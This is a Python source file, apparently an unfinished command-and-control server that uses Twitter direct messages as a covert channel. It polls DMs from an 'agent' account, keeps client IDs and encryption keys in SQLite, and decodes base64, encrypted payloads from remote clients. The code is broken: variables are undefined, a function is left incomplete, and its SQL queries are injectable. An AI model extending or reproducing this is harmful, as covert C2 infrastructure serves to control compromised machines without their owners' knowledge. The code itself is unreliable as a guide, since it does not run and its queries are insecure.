#!/usr/bin/python3

import tweepy, os, base64, _thread, sqlite3
from ast import literal_eval
from subprocess import Popen, PIPE
from termcolor import colored as c
from tweepy import OAuthHandler
# Local libs below
import config
from libs.console import Autocomplete, start_shell
import libs.formatting as formatting

class Vars(object):
	queue = []
var = Vars()

# Twitter Auth and API configuration
auth = OAuthHandler(config.keys['consumer_key'],config.keys['consumer_secret'])
auth.set_access_token(config.keys['access_token'],config.keys['access_secret'])
api = tweepy.API(auth, wait_on_rate_limit=True)

# Database config and first run setup
db = sqlite3.connect("database.db")
cursor = db.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS commands (ID TEXT PRIMARY KEY NOT NULL, RESULT TEXT, RECV INTEGER NOT NULL, SENT INTEGER NOT NULL)") # To store commands and results
cursor.execute("CREATE TABLE IF NOT EXISTS clients (ID TEXT PRIMARY KEY NOT NULL, KEY TEXT NOT NULL, NICK TEXT)") # To store encryption keys for clients and (optionally) nicknames
cursor.execute("CREATE TABLE IF NOT EXISTS ignore (ID TEXT PRIMARY KEY NOT NULL)") # To store ids of msgs to ignore
db.commit()
db.close()

def cursor(cmd):
	db = sqlite3.connect("database.db")
	res = db.cursor().execute(cmd).fetchall()
	db.commit()
	db.close()
	return res

# Pretty colours
def error(msg): return "%s %s" % (c("[!]","red"),msg)
def info(msg): return "%s %s" % (c("[*]","cyan"),msg)
def fail(msg): return "[%s] : %s" % (c("FAILED","red"),msg)
def ok(msg): return "[  %s  ] : %s" % (c("OK","green"),msg)
def done(msg): return "[ %s ] : %s" % (c("DONE","green"),msg)

# Twitter stuff
def ignore():
	ids = cursor("SELECT ID FROM ignore")
	res = []
	for i in ids:
		res.append(i[0])
	return res
def add_ignore(id):
	if id in ignore():
		return None
	a = cursor("INSERT INTO ignore (ID) VALUES ('%s')" % id)


def check_dms(wait=1):
	while True:
		for dm in api.direct_messages(tweet_mode='extended'):
			if dm.sender_screen_name == config.agent_username:
				id = dm.id
				if (not id in ignore()) and (not id in vars.queue):
					vars.queue.append(id)
		time.sleep(wait)
def sort_queue():
	for id in vars.queue:
		msg = api.get_direct_message(ID, tweet_mode='extended', full_text=True)
		handle_message(msg)
		vars.queue.remove(id)
		add_ignore(id)



# Commands and Command Handler
man = {
	'help':'Prints the help menue',
	'exit':'Exits the program',
	'man':'Print help for a single command. Usage: "man help"',
}

def help_menu(): # ooh, pretty
	built = ''
	for i in man:
		built += "\n%s : %s" % (i, c(man[i],"green"))
	return built

class CmdHandler(object):
	commands = []
	for i in man:
		commands.append(i)
	def handle(self, cmd):
		if cmd == "" or cmd == " ":
			return None
		try:
			base = cmd.split(" ")[0]
		except:
			base = cmd
		if base == "help":
			print(help_menu())
			return None
		elif base == "exit":
			sure = input("Are you sure? %s/%s: " % (c("y","green"),c("N","red"))).lower()
			if not sure == "y":
				return None
			exit_sequence() #TODO
			return "exit"
		elif base == "man":
			try:
				helpobj = cmd.split(" ")[1]
			except:
				print(error("man: Requires one argument"))
				helpobj = "man"
			if not helpobj in man:
				print(error("man: Command not found"))
				return None
			print("%s : %s" % (helpobj,c(man[helpobj],"green")))
			return None
		else:
			print(error("Command not found / Invalid syntax"))
			return None

# Message handling
def all_cliids():
	ids = cursor("SELECT ID FROM clients")
	res = []
	for i in ids:
		res.append(i[0])
	return res
def get_cli_key(cliid):
	return cursor("SELECT KEY FROM clients WHERE ID='%s'" % cliid)[0][0]

def handle_message(msg):
	if not '$' in msg:
		return None
	data = msg.split("$tcnc$")[1]
	json = base64.b64decode(json).decode()
	msg = literal_eval(json)
	# Ok, now that the msg has been decoded,
	if not msg['cliid'] in all_cliids():
		return None
	key = get_cli_key(msg['cliid'])
	pcall = msg['type']
	pl = literal_eval(formatting.decode(msg['data'],key)) # pl = payload (the encrypted data sent with the message)
	if pcall == "hello":
		#TODO: continue here










# Main program & stuff

#TODO
def start_sequence():
	pass
def exit_sequence():
	pass

#TODO
def main():
	start_sequence()
	#uhh
	exit_sequence()

if __name__ == "__main__":
	main()
